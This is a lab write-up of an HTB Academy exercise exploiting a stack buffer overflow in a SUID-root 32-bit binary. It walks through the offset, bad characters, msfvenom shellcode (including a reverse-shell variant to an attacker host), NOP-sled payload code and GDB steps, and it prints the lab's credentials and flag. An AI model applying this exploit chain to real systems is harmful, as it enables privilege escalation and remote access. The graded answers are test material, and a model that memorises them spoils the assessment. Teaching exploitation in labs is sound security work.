# Stack-Based Buffer Overflow — `leave_msg` (HTB Academy)

## Scenario

SSH access was obtained to `nixbof32skills` via password reuse (`htb-student` / `HTB_@cademy_stdnt!`). The user `htb-student` can run a SUID-root binary, `leave_msg`, which writes messages to `/htb-student/msg.txt`. The binary is `-rwsr-xr-x`, owned by `root`. Goal: confirm it's vulnerable to a stack-based buffer overflow and use it to read `/root/flag.txt`.

---

## Answers

| # | Question | Answer |
|---|---|---|
| 1 | File type of `leave_msg` | `ELF 32-bit` |
| 2 | Bytes to send before reaching EIP | `2060` (offset measured via cyclic pattern) |
| 3 | Stack space after overwriting EIP | `0x22000` |
| 4 | Content of `/root/flag.txt` | `HTB{wmcaJe4dEFZ3pbgDEpToJxFwvTEP4t}` |

> **Note on Q2/Q3:** these are two different measurements and shouldn't share the same value. Q3 (`0x22000`) is the raw size of the `[stack]` memory mapping, read directly off `info proc mappings`. Q2 (`2060`) is the byte offset to EIP, found via the pattern-create/pattern-offset method.
>
> **Separately, during actual exploit-building** (not the graded question — a later, real-world invocation with a different `argv[0]`/environment), testing showed the effective offset needed to be `2064` for the payload to land cleanly on EIP rather than on saved EBP. That's a normal side effect of small stack-layout shifts between invocation contexts, not a correction to the graded answer.

---

## Phase 1 — Recon: is it actually vulnerable?

**Check permissions:**
```bash
ls -la
```
Look for `-rwsr-xr-x`, owned by `root` — the `s` in the owner-execute slot is the SUID bit. This binary always runs with root's privileges, which is what makes finding a bug in it worthwhile.

**Check file type:**
```bash
file leave_msg
```
→ `ELF 32-bit LSB executable, Intel 80386...`

**Disassemble to find the vulnerable function:**
```bash
objdump -d -M intel leave_msg | grep -A 40 '<main>:'
objdump -d -M intel leave_msg | grep -A 60 '<leavemsg>:'
```

In `main`, `argv[1]` gets passed into `leavemsg()`. Inside `leavemsg`, two things happen:

1. It first calls `fopen()` on a **hardcoded path** (found via `objdump -s -j .rodata leave_msg` → `/home/htb-student/msg.txt`), and exits with "File doesn't exist." if that fails. This file must already exist for execution to continue.
2. It then does:
   ```asm
   push DWORD PTR [ebp+0x8]   ; argv[1] — attacker-controlled
   lea  eax,[ebp-0x808]        ; fixed 0x804-byte (2052-byte) stack buffer
   push eax
   call strcpy@plt              ; no bounds checking!
   ```
   `strcpy` copies `argv[1]` into a fixed-size buffer with **no length check**. Any input longer than 2052 bytes overflows into adjacent stack memory — including the saved return address (EIP). **This is the vulnerability.**

---

## Phase 2 — Find the exact offset to EIP

Never calculated — always measured by crashing the program and reading the value off.

**1. Generate a cyclic (non-repeating) pattern:**

Metasploit's location differs by distro:
- Arch: `/opt/metasploit/tools/exploit/pattern_create.rb`
- Kali/Debian-based (HTB Pwnbox): `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb`

```bash
/opt/metasploit/tools/exploit/pattern_create.rb -l 2500
```

**2. Feed it to the binary under GDB and crash it:**
```
gdb -q ./leave_msg
gef➤  run $(python3 -c "print('<pattern>')")
```
(On systems where `python` is Python 2, HTB's original `print '...'` syntax — no parentheses — works as-is.)

**3. Read EIP at the crash:**
```
gef➤  info registers eip
```

**4. Look up the offset:**
```bash
/opt/metasploit/tools/exploit/pattern_offset.rb -q <eip_value>
```
That number is your offset.

---

## Phase 3 — Find bad characters

Bad characters are bytes that get mangled/truncated by the program's input path — `\x00` is nearly universal (C string functions treat it as end-of-string). For `leave_msg`, testing found: **`\x00 \x09 \x0a \x20`**.

**Test payload:** junk filler, every byte value 0x00–0xff in order, then an EIP marker:
```python
offset = 2060
buf   = b"\x55" * (offset - 256 - 4)
chars = bytes(range(256))
eip   = b"\x66" * 4
payload = buf + chars + eip
```
Crash it, dump the stack at the CHARS location, and compare byte-for-byte against `00 01 02 03...ff`. Anything missing/altered is a bad char.

---

## Phase 4 — Generate shellcode

```bash
msfvenom -p linux/x86/exec CMD="cat /root/flag.txt" \
  --bad-chars "\x00\x09\x0a\x20" -f python
```

Since the goal was reading a specific file (not an interactive shell), `linux/x86/exec` with a direct `CMD=` was simpler and sufficient — no listener needed. Note the **`Payload size: XX bytes`** in the output; you need this exact number for the next step.

(A reverse shell alternative, for comparison:)
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> \
  --platform linux --arch x86 --format c --bad-chars "\x00\x09\x0a\x20" --out shellcode
```

---

## Phase 5 — Method A: Fixed address into a NOP sled

**Layout:**
```
[ NOP sled ][ shellcode ][ junk padding ][ EIP → address inside the NOP sled ]
```

**Math:**
```python
offset      = 2064          # graded offset was 2060; this run needed +4 (see Q2/Q3 note above)
nop_size    = 500           # arbitrary choice — just needs margin
shell_size  = 81            # from msfvenom's "Payload size" output
eip_size    = 4              # fixed on 32-bit x86 (8 on x64)

buffer_len = offset - nop_size - shell_size - eip_size
```

```python
import sys
nop = b'\x90' * 500
shellcode = b'\xd9\xcd\xd9\x74\x24\xf4...'   # real msfvenom bytes
buf = b'\x55' * buffer_len
eip = b'\x66\x66\x66\x66'    # placeholder
payload = nop + shellcode + buf + eip
sys.stdout.buffer.write(payload)
```

Order is NOP → shellcode → junk → EIP (not the reverse) because the return address needs to point at the *start* of the payload — the sled and shellcode have to come first.

**Test with the placeholder EIP, confirm control:**
```
gef➤  run $(python3 shellcode.py)
```
Expect:
```
Program received signal SIGSEGV, Segmentation fault.
0x66666666 in ?? ()
```

**Troubleshooting — crash lands *inside* the vulnerable function instead** (e.g. `0x56555700 in leavemsg ()`):
```
gef➤  b *leavemsg+0x72     # right after strcpy returns
gef➤  run $(python3 shellcode.py)
gef➤  x/8wx $ebp-0x8
```
If `0x66666666` shows up in **saved EBP** rather than the **return address slot** (`[ebp+4]`), the offset is short by exactly 4 bytes — this is what happened here (`2060` → `2064`). Different invocation contexts (full path vs. relative path, GDB vs. standalone, `argv[0]` length) shift the stack slightly, which is why the offset measured in one context didn't transfer perfectly to another.

**Find a real address inside the NOP sled:**

With GEF (`gef➤` prompt):
```
gef➤  search-pattern \x90\x90\x90\x90\x90\x90\x90\x90
```
Without GEF (plain `(gdb)` prompt — e.g. GEF didn't autoload this session):
```
(gdb) find $esp, $esp+3000, 0x90909090
```
This returns a long run of hits (one per overlapping byte position within the sled) — pick an address from the **middle** for margin against stack-position drift between GDB and a standalone run.

**Convert to little-endian:**
```
0xffffd050  →  b'\x50\xd0\xff\xff'
```

**Run for real, outside GDB:**
```bash
./leave_msg "$(python3 shellcode.py)"
```

> **Critical:** always do the final test **outside GDB**. Debugging a SUID binary causes the kernel to drop its elevated privileges — under GDB you'll see `Permission denied` even with a working exploit, and the real root-level effect only shows up running standalone.

---

## Phase 6 — Method B: HTB's manual dump-inspection approach

Instead of guessing/searching for a NOP-sled address ahead of time, build the full payload once, crash it, and read the shellcode's real address directly off a live memory dump.

**1. Build the full payload inline:**
```
(gdb) run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "<shellcode>" + "\x66" * 4')
```

**2. Break before the crash tears down the process:**
```
(gdb) b *bowfunc
```

**3. Dump a wide chunk of the stack:**
```
(gdb) x/2000xb $esp+550
```

**4. Scan for where the NOPs end and shellcode begins:**
```
0xffffd65c: 0x90  0x90  0xda  0xca  0xba  0xe4  0x11  0xd4
                        ↑ shellcode starts here
```

**5. That address is the real return address.** Convert to little-endian, drop it into the payload in place of the placeholder, rebuild, and re-run — same final steps as Method A.

**When to use which:**
- **Method A** (NOP sled + search) — faster, forgiving with a generous sled.
- **Method B** (exact address from a live dump) — more precise, useful when space is tight or you want to see exactly where every byte landed rather than relying on a wide margin.

---

## Common pitfalls (quick reference)

| Symptom | Likely cause |
|---|---|
| Crash happens *inside* the vulnerable function, not at `ret` | Offset short by a few bytes — check if the marker landed in saved EBP instead of EIP |
| `strcpy`/pattern truncates early | A `\x00` bad character got into the payload |
| Works under GDB but "Permission denied" on the real run | Backwards expectation — GDB *drops* SUID privileges; the real exploit only works standalone |
| `pattern_offset.rb`/`pattern_create.rb`: command not found | Path differs by distro — `pacman -Ql metasploit \| grep pattern` (Arch) vs. `/usr/share/metasploit-framework/...` (Kali/Debian) |
| `search-pattern` undefined in GDB | GEF isn't loaded this session (plain `(gdb)` prompt, not `gef➤`) — use built-in `find` instead |
| Written file size on disk doesn't match intended payload length | A bad character (usually `\x00`) truncated the copy early |
| `msfvenom` errors "arch incompatible with payload" | Payload path (`linux/x64/...` vs `linux/x86/...`) doesn't match the `--arch` flag |
| SSH hangs at "Connecting to..." forever | HTB Academy VPN not connected — check `ip a \| grep tun` |
